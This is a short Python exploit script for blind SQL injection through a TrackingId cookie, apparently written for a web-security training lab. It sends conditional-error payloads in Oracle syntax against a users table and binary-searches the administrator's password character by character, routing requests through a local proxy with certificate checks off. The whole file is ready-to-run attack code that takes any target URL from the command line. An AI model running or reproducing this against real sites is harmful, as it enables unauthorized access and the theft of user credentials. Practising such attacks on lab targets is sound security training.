import requests
import urllib.parse
import urllib3
import sys
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = sys.argv[1]
tracking_id = sys.argv[2]
session_id = sys.argv[3]
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

pas=''
char_str = '0123456789abcdefghijklmnopqrstuvwxyz'

def check(payload: str) -> bool:
    full_tracking_id = urllib.parse.quote(tracking_id + payload)
    cookies={'TrackingId':full_tracking_id , 'session':session_id}
    r = requests.get(url,cookies=cookies,proxies=proxies,verify=False)
    return 'Error' in r.text

def bin_search(start: int,end: int,loc: int) -> str:
    if start>end:
       return '?'
    mid=(start+end) // 2
    mid_char=char_str[mid]
    char_ascii = ord(char_str[mid])
    payload = f"' union select case when (username='administrator' and ascii(substr(password,{loc},1))<{char_ascii}) then to_char(1/0) else null end from users-- "
    if(check(payload)):
       return bin_search(start,mid-1,loc)
    payload = f"' union select case when (username='administrator' and ascii(substr(password,{loc},1))>{char_ascii}) then to_char(1/0) else null end from users-- "
    if(check(payload)):
        return bin_search(mid+1,end,loc)
    return mid_char
    
print('[+] Getting password...')
for i in range(1,21):
   pas += bin_search(0,len(char_str)-1 ,i)
   print(f"[{i}]->{pas}")
print(f'\n[+] Password is ->{pas}')
    

